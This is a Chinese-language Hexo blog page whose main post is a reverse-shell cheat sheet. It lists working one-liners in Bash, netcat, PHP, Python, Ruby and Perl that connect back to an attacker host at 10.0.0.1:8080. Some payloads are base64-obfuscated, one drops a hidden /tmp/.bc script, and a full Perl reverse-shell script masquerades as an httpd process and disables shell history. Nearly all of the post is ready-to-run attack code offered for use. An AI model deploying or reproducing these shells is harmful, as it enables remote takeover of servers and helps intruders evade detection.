<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/4/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/09/反弹Shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/09/反弹Shell/" itemprop="url">反弹Shell</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-09T23:53:55+08:00">
                2017-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>假设攻击端为10.0.0.1，接收端口为8080</p>
<p>服务器端为10.0.0.2</p>
<h3 id="1、Bash"><a href="#1、Bash" class="headerlink" title="1、Bash"></a>1、Bash</h3><p>关于bash中的重定向知识，可以参考<a href="/2018/04/10/shell之后的操作/">shell之后的操作</a></p>
<p>服务器端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &apos;sh -i &amp;&gt;/dev/tcp/10.0.0.1/8080 0&gt;&amp;1&apos;</div></pre></td></tr></table></figure>
<p>攻击端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 8080</div></pre></td></tr></table></figure>
<h3 id="2、NetCat"><a href="#2、NetCat" class="headerlink" title="2、NetCat"></a>2、NetCat</h3><p>服务器端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh 10.0.0.1 8080</div><div class="line">nc -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
<p>现在的很多/bin/nc -&gt; /etc/alternatives/nc -&gt; /bin/nc.openbsd</p>
<p>但是实际上这个nc.openbsd不支持nc -e命令</p>
<p>所以我们最好使用的是/bin/nc.traditional</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/nc.traditional -e /bin/sh 10.0.0.1 8080</div></pre></td></tr></table></figure>
<p>当然若没有/bin/nc.traditional这个nc传统版，我们也可以使用下面的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 8080 &gt;/tmp/f</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">本地监听两个端口,通过管道,一处输入,一处输出</div><div class="line">nc 10.0.0.1 2333|/bin/sh|nc 10.0.0.1 2444</div></pre></td></tr></table></figure>
<p><img src="/images/2017-12-10/43-300x71.png" alt="img"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 10.0.0.1 8080 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">将nc替换成telnet</div><div class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe</div></pre></td></tr></table></figure>
<h3 id="3、PHP"><a href="#3、PHP" class="headerlink" title="3、PHP"></a>3、PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</div></pre></td></tr></table></figure>
<p>不知道怎么回事，这个反弹的shell并不能用。代码假设TCP连接的文件描述符为3，如果不行可以试下4,5,6。当然推荐使用下面的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;set_time_limit(0);$a=&quot;1.0&quot;;$b=&quot;10.0.0.1&quot;;$c=8080;$d=1400;$e=null;$f=null;$g=&quot;uname -a; w; id; /bin/sh -i&quot;;$h=0;$i=0;if(function_exists(&quot;pcntl_fork&quot;))&#123;$j=pcntl_fork();if($j==-1)&#123;printit(&quot;ERROR: Can not fork&quot;);exit(1);&#125;if($j)&#123;exit(0);&#125;if(posix_setsid()==-1)&#123;printit(&quot;Error: Can not setsid()&quot;);exit(1);&#125;$h=1;&#125;else&#123;printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$k=fsockopen($b,$c,$l,$m,30);if(!$k)&#123;printit(&quot;$m ($l)&quot;);exit(1);&#125;$n=array(0=&gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&gt;array(&quot;pipe&quot;,&quot;w&quot;));$o=proc_open($g,$n,$p);if(!is_resource($o))&#123;printit(&quot;ERROR: Can not spawn shell&quot;);exit(1);&#125;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($k,0);printit(&quot;Successfully opened reverse shell to $b:$c&quot;);while(1)&#123;if(feof($k))&#123;printit(&quot;ERROR: Shell connection terminated&quot;);break;&#125;if(feof($p[1]))&#123;printit(&quot;ERROR: Shell process terminated&quot;);break;&#125;$q=array($k,$p[1],$p[2]);$r=stream_select($q,$e,$f,null);if(in_array($k,$q))&#123;if($i)printit(&quot;SOCK READ&quot;);$s=fread($k,$d);if($i)printit(&quot;SOCK: $s&quot;);fwrite($p[0],$s);&#125;if(in_array($p[1],$q))&#123;if($i)printit(&quot;STDOUT READ&quot;);$s=fread($p[1],$d);if($i)printit(&quot;STDOUT: $s&quot;);fwrite($k,$s);&#125;if(in_array($p[2],$q))&#123;if($i)printit(&quot;STDERR READ&quot;);$s=fread($p[2],$d);if($i)printit(&quot;STDERR: $s&quot;);fwrite($k,$s);&#125;&#125;fclose($k);fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($o);function printit($t)&#123;if(!$h)&#123;print&quot;$t\n&quot;;&#125;&#125;&apos;</div></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r &apos;function which($a)&#123;$b=execute(&quot;which $a&quot;);return($b?$b:$a);&#125;function execute($c)&#123;$d=&quot;&quot;;if($c)&#123;if(function_exists(&quot;exec&quot;))&#123;@exec($c,$d);$d=join(&quot;\n&quot;,$d);&#125;elseif(function_exists(&quot;shell_exec&quot;))&#123;$d=@shell_exec($c);&#125;elseif(function_exists(&quot;system&quot;))&#123;@ob_start();@system($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(function_exists(&quot;passthru&quot;))&#123;@ob_start();@passthru($c);$d=@ob_get_contents();@ob_end_clean();&#125;elseif(@is_resource($e=@popen($c,&quot;r&quot;)))&#123;$d=&quot;&quot;;while(!@feof($e))&#123;$d.=@fread($e,1024);&#125;@pclose($e);&#125;&#125;return $d;&#125;function cf($g,$h)&#123;if($i=@fopen($g,&quot;w&quot;))&#123;@fputs($i,@base64_decode($h));@fclose($i);&#125;&#125;$j=&quot;10.0.0.1&quot;;$k=&quot;8080&quot;;$l=array(&quot;perl&quot;=&gt;&quot;perl&quot;,&quot;c&quot;=&gt;&quot;c&quot;);$m=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;cf(&quot;/tmp/.bc&quot;,$m);$d=execute(which(&quot;perl&quot;).&quot; /tmp/.bc $j $k &amp;&quot;);&apos;</div></pre></td></tr></table></figure>
<h3 id="4、Python"><a href="#4、Python" class="headerlink" title="4、Python"></a>4、Python</h3><p>以python2.7为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &quot;exec(\&quot;import socket, subprocess;s =socket.socket();s.connect((&apos;10.0.0.1&apos;,8080))\nwhile 1: proc =subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">若将</div><div class="line">import socket,subprocess,os</div><div class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div><div class="line">s.connect((&quot;10.0.0.1&quot;,8080))</div><div class="line">os.dup2(s.fileno(),0)</div><div class="line">os.dup2(s.fileno(),1)</div><div class="line">os.dup2(s.fileno(),2)</div><div class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</div><div class="line">base64加密后生成另外的shell</div><div class="line"></div><div class="line">python -c &apos;import base64;exec(base64.b64decode(&quot;aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTAuMC4wLjEnLDgwODApKQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KDQwOTYpCndoaWxlIGxlbihkKSE9bDoKCWQrPXMucmVjdig0MDk2KQpleGVjKGQseydzJzpzfSkK&quot;))&apos;</div></pre></td></tr></table></figure>
<h3 id="5、Ruby"><a href="#5、Ruby" class="headerlink" title="5、Ruby"></a>5、Ruby</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</div></pre></td></tr></table></figure>
<p>不依赖于/bin/sh的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
<p>windows环境下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</div></pre></td></tr></table></figure>
<p>MSF中的相应的反弹shell代码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'open3'</span></div><div class="line"></div><div class="line"><span class="comment">#Set the Remote Host IP</span></div><div class="line">RHOST = <span class="string">"192.168.1.10"</span> </div><div class="line"><span class="comment">#Set the Remote Host Port</span></div><div class="line">PORT = <span class="string">"6667"</span></div><div class="line"></div><div class="line"><span class="comment">#Tries to connect every 20 sec until it connects.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">sock = TCPSocket.new <span class="string">"<span class="subst">#&#123;RHOST&#125;</span>"</span>, <span class="string">"<span class="subst">#&#123;PORT&#125;</span>"</span></div><div class="line">sock.puts <span class="string">"We are connected!"</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  sleep <span class="number">20</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">#Runs the commands you type and sends you back the stdout and stderr.</span></div><div class="line"><span class="keyword">begin</span></div><div class="line">  <span class="keyword">while</span> line = sock.gets</div><div class="line">    Open3.popen2e(<span class="string">"<span class="subst">#&#123;line&#125;</span>"</span>) <span class="keyword">do</span> <span class="params">| stdin, stdout_and_stderr |</span></div><div class="line">              IO.copy_stream(stdout_and_stderr, sock)</div><div class="line">              <span class="keyword">end</span>  </div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">rescue</span></div><div class="line">  <span class="keyword">retry</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<h3 id="6、Perl"><a href="#6、Perl" class="headerlink" title="6、Perl"></a>6、Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</div></pre></td></tr></table></figure>
<p>一个不依赖调用/bin/bash的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e &apos;use IO::Socket;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div></pre></td></tr></table></figure>
<p>完整的perl反弹shell脚本</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl -w</span></div><div class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> Socket;</div><div class="line"><span class="keyword">use</span> FileHandle;</div><div class="line"><span class="keyword">use</span> POSIX;</div><div class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</div><div class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></div><div class="line"><span class="keyword">my</span> $ip = <span class="string">'x.x.x.x'</span>;</div><div class="line"><span class="keyword">my</span> $port = <span class="number">2333</span>;</div><div class="line"><span class="comment"># Options</span></div><div class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</div><div class="line"><span class="keyword">my</span> $auth = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></div><div class="line"><span class="comment"># source IP can access the reverse shell</span></div><div class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(/^127\.0\.0\.1$/)</span>;</div><div class="line"><span class="comment"># Declarations</span></div><div class="line"><span class="keyword">my</span> $global_page = <span class="string">""</span>;</div><div class="line"><span class="keyword">my</span> $fake_process_name = <span class="string">"/usr/sbin/apache"</span>;</div><div class="line"><span class="comment"># Change the process name to be less conspicious</span></div><div class="line">$0 = <span class="string">"[httpd]"</span>;</div><div class="line"><span class="comment"># Authenticate based on source IP address if required</span></div><div class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125;)) &#123;</div><div class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</div><div class="line">    <span class="keyword">if</span> ($auth) &#123;</div><div class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</div><div class="line">        cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</div><div class="line">        cgiexit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</div><div class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</div><div class="line">    cgiexit(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Background and dissociate from parent process if required</span></div><div class="line"><span class="keyword">if</span> ($daemon) &#123;</div><div class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</div><div class="line">    <span class="keyword">if</span> ($pid) &#123;</div><div class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></div><div class="line">    &#125;</div><div class="line">    setsid();</div><div class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</div><div class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Make TCP connection for reverse shell</span></div><div class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</div><div class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</div><div class="line">    cgiprintpage();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</div><div class="line">    cgiexit();</div><div class="line">&#125;</div><div class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></div><div class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</div><div class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</div><div class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</div><div class="line"><span class="comment"># Wrapper around print</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</div><div class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</div><div class="line">    $line .= <span class="string">"&amp;lt;p&amp;gt;\n"</span>;</div><div class="line">    $global_page .= $line;</div><div class="line">&#125;</div><div class="line"><span class="comment"># Wrapper around exit</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</div><div class="line">    cgiprintpage();</div><div class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r</span></div><div class="line">Connection: close\r</div><div class="line">Content-Type: text\/html\r\n\r\n" . $global_page;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
